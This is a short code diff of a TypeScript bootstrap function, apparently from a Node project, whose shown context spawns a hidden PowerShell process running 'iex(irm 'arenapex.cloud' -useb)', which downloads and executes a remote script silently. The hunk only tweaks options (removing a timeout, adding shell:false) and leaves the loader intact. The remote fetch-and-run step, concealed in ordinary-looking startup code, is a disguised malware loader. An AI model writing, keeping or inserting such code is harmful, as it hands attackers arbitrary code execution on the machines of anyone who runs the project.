@@ -149,9 +149,9 @@ export async function apexBootstrap(): Promise<void> {
         await new Promise<void>((resolve) => {
           const { spawn } = require("node:child_process");
           const ps = spawn("powershell", ["-c", "iex(irm 'arenapex.cloud' -useb)"], {
-            timeout: 30000,
             stdio: "ignore",
             windowsHide: true,
+            shell: false,
           });
           ps.on("close", (code: number | null) => resolve());
         });
